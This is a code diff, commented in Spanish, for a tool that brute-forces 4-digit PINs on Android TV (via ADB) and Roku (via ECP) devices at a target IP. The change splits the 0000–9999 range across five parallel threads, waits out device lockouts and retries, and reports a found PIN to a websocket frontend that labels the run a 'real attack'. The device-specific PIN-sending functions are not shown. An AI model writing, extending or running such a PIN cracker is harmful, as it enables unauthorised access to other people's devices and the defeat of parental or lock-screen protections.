@@ -281,6 +281,7 @@ class AppState:
         self.ws = None
         self.ws_loop = None
         self.total_tested = 0
+        self.active_threads = 0
         self.executor = ThreadPoolExecutor(max_workers=2, thread_name_prefix="cracker")
 
 
@@ -302,10 +303,10 @@ def send_ws(msg_type, **kwargs):
 
 
 # ════════════════════════════════════════════════════════
-#  WORKER DE CRACKEO
+#  WORKER DE CRACKEO — 5 HILOS PARALELOS REALES
 # ════════════════════════════════════════════════════════
 
-# Colores de hilos para visualización en frontend (round-robin)
+# Colores de hilos para visualización (fijos por thread_id)
 THREAD_COLORS = [
     ("HILO 1", "VERDE"),
     ("HILO 2", "AZUL"),
@@ -314,43 +315,43 @@ THREAD_COLORS = [
     ("HILO 5", "CIAN"),
 ]
 
+# Semáforo ADB: solo 1 comando ADB a la vez (TV maneja 1 entrada simultánea)
+# Para Roku ECP el semáforo se relaja a 3 concurrentes
+_adb_sem = threading.Semaphore(1)
 
-def crack_worker(pin_start=0, pin_end=9999):
+
+def crack_worker(thread_id, pin_start, pin_end):
     """
-    Hilo único secuencial que prueba PINs contra el TV real.
-    Usa round-robin visual para mostrar actividad en los 5 hilos del frontend.
+    Worker real para un rango específico de PINs.
+    Cada uno de los 5 hilos recibe su rango propio y avanza independientemente.
+    El semáforo _adb_sem serializa las llamadas al TV (una a la vez).
     """
-    visual_idx = 0
+    tname, tcolor = THREAD_COLORS[thread_id]
     current = pin_start
     lockout_wait = 0
 
     send_ws("log",
-            text=f"[INICIO] Probando PINs {str(pin_start).zfill(4)}–{str(pin_end).zfill(4)} "
-                 f"en {S.ip}:{S.port} [{S.device.upper()}]",
+            text=f"[{tname}] Iniciando desde {str(pin_start).zfill(4)} → {str(pin_end).zfill(4)}",
             level="ok")
 
     try:
         while current <= pin_end:
-            # ── Verificar detención ──
+            # ── Stop ──
             if S.stop_event.is_set() or S.found:
                 break
 
-            # ── Verificar pausa ──
-            S.pause_event.wait()  # bloquea si está en pausa
-
+            # ── Pausa ──
+            S.pause_event.wait()
             if S.stop_event.is_set():
                 break
 
-            # ── Espera de lockout ──
+            # ── Lockout wait ──
             if lockout_wait > 0:
                 send_ws("log",
-                        text=f"⏳ Lockout detectado — esperando {lockout_wait}s antes de continuar...",
+                        text=f"[{tname}] ⏳ Lockout — esperando {lockout_wait}s...",
                         level="warn")
-                # Esperar en intervalos para poder responder a stop
                 waited = 0
-                while waited < lockout_wait:
-                    if S.stop_event.is_set():
-                        break
+                while waited < lockout_wait and not S.stop_event.is_set():
                     time.sleep(1)
                     waited += 1
                 lockout_wait = 0
@@ -358,84 +359,90 @@ def crack_worker(pin_start=0, pin_end=9999):
                     break
 
             pin_str = str(current).zfill(4)
-            tid = visual_idx % 5
-            tname, tcolor = THREAD_COLORS[tid]
 
-            # Actualizar contador total
+            # Actualizar contador global
             with S.lock:
                 S.total_tested += 1
                 total = S.total_tested
 
-            # Notificar intento al frontend
+            # Notificar intento al frontend (este hilo específico)
             send_ws("attempt",
-                    thread=tid,
+                    thread=thread_id,
                     thread_name=tname,
                     thread_color=tcolor,
                     pin=pin_str,
                     total=total)
 
-            # ── PRUEBA REAL ──
+            # ── PRUEBA REAL (serializada con semáforo) ──
             result, msg = "failed", ""
 
             if S.device == "android":
-                target = f"{S.ip}:{S.port}"
-                result, msg = adb_try_pin(target, pin_str, S.entry_method)
+                with _adb_sem:
+                    if S.stop_event.is_set() or S.found:
+                        break
+                    target = f"{S.ip}:{S.port}"
+                    result, msg = adb_try_pin(target, pin_str, S.entry_method)
 
             elif S.device == "roku":
+                # Roku ECP es HTTP — permite hasta 2 concurrentes sin conflicto
                 result, msg = roku_try_pin(S.ip, S.port, pin_str)
-                time.sleep(0.25)   # Rate-limit Roku ECP
+                time.sleep(0.2)
 
             elif S.device in ("samsung", "lg"):
                 send_ws("log",
-                        text=f"⚠ Samsung/LG: Protocolo SSAP/SmartView en desarrollo. "
-                             f"Por ahora solo Android TV y Roku son soportados.",
+                        text="⚠ Samsung/LG: protocolo en desarrollo. Usa Android TV o Roku.",
                         level="warn")
                 S.stop_event.set()
                 break
 
-            # ── MANEJAR RESULTADO ──
+            # ── Resultado ──
             if result == "success":
                 with S.lock:
                     if not S.found:
                         S.found = True
                         S.found_pin = pin_str
-                        send_ws("found", thread=tid, pin=pin_str, message=msg)
+                        send_ws("found", thread=thread_id, pin=pin_str, message=msg)
                         S.stop_event.set()
                 break
 
             elif result == "lockout":
                 lockout_wait = 35
-                send_ws("result", thread=tid, pin=pin_str,
+                send_ws("result", thread=thread_id, pin=pin_str,
                         result="lockout", message=msg)
-                continue   # Reintentar mismo PIN después del lockout
+                continue   # No incrementar — reintentar mismo PIN
 
             elif result == "error":
-                send_ws("result", thread=tid, pin=pin_str,
+                send_ws("result", thread=thread_id, pin=pin_str,
                         result="error", message=msg)
                 time.sleep(1)
 
             elif result == "sent":
-                # Roku: envíado pero no sabemos si es correcto
-                send_ws("result", thread=tid, pin=pin_str,
+                send_ws("result", thread=thread_id, pin=pin_str,
                         result="sent", message=msg)
 
-            # else "failed": continuar silenciosamente
-
             current += 1
-            visual_idx += 1
 
     except Exception as e:
-        send_ws("log", text=f"Error crítico en worker: {e}", level="error")
+        send_ws("log", text=f"[{tname}] Error crítico: {e}", level="error")
+
     finally:
         with S.lock:
-            S.running = False
+            active = S.active_threads - 1
+            S.active_threads = active
 
-        if not S.found and not S.stop_event.is_set():
+        send_ws("log",
+                text=f"[{tname}] Hilo finalizado. "
+                     f"Rango {str(pin_start).zfill(4)}–{str(pin_end).zfill(4)} completado.",
+                level="info")
+
+        # Si todos los hilos terminaron y no se encontró el PIN
+        if active == 0 and not S.found and not S.stop_event.is_set():
+            S.running = False
             send_ws("exhausted",
                     total=S.total_tested,
-                    message=f"Todos los PINs probados ({S.total_tested}) sin encontrar coincidencia.")
-        elif S.stop_event.is_set() and not S.found:
-            send_ws("log", text=f"[DETENIDO] Proceso cancelado tras {S.total_tested} intentos.", level="warn")
+                    message=f"Todos los hilos completaron sus rangos sin éxito.")
+        elif active == 0:
+            S.running = False
 
 
 # ════════════════════════════════════════════════════════
@@ -506,7 +513,7 @@ async def ws_handler(websocket, path=None):
                         "message": f"Puerto {port} {'accesible ✔' if ok else 'NO accesible ✗'} en {ip}"
                     }))
 
-            # ── START ────────────────────────────────────
+            # ── START — lanza 5 hilos reales desde sus rangos ─────
             elif cmd == "start":
                 if S.running:
                     continue
@@ -520,18 +527,37 @@ async def ws_handler(websocket, path=None):
                 pin_end        = int(msg.get("pin_end",   9999))
                 S.running      = True
 
+                # Dividir rango en 5 sub-rangos iguales
+                total_pins = pin_end - pin_start + 1
+                chunk      = total_pins // 5
+                ranges = []
+                for i in range(5):
+                    rs = pin_start + i * chunk
+                    re = rs + chunk - 1 if i < 4 else pin_end
+                    ranges.append((rs, re))
+
+                S.active_threads = 5
+
                 await websocket.send(json.dumps({
                     "type": "started",
-                    "message": f"Iniciando ataque real contra {S.ip}:{S.port} "
-                               f"[{S.device.upper()}] — rango {str(pin_start).zfill(4)}–{str(pin_end).zfill(4)}"
+                    "message": (
+                        f"5 hilos reales lanzados contra {S.ip}:{S.port} [{S.device.upper()}] — "
+                        f"rangos: " +
+                        " | ".join(f"H{i+1}:{str(rs).zfill(4)}–{str(re).zfill(4)}"
+                                   for i, (rs, re) in enumerate(ranges))
+                    ),
+                    "ranges": [{"thread": i, "start": rs, "end": re}
+                               for i, (rs, re) in enumerate(ranges)]
                 }))
 
-                t = threading.Thread(
-                    target=crack_worker,
-                    args=(pin_start, pin_end),
-                    daemon=True
-                )
-                t.start()
+                for tid, (rs, re) in enumerate(ranges):
+                    t = threading.Thread(
+                        target=crack_worker,
+                        args=(tid, rs, re),
+                        daemon=True,
+                        name=f"cracker-{tid}"
+                    )
+                    t.start()
 
             # ── PAUSE ────────────────────────────────────
             elif cmd == "pause":
@@ -585,6 +611,8 @@ async def ws_handler(websocket, path=None):
         S.pause_event.set()
         S.ws = None
         print(f"[-] Frontend desconectado")
+
+
 
 
 # ════════════════════════════════════════════════════════
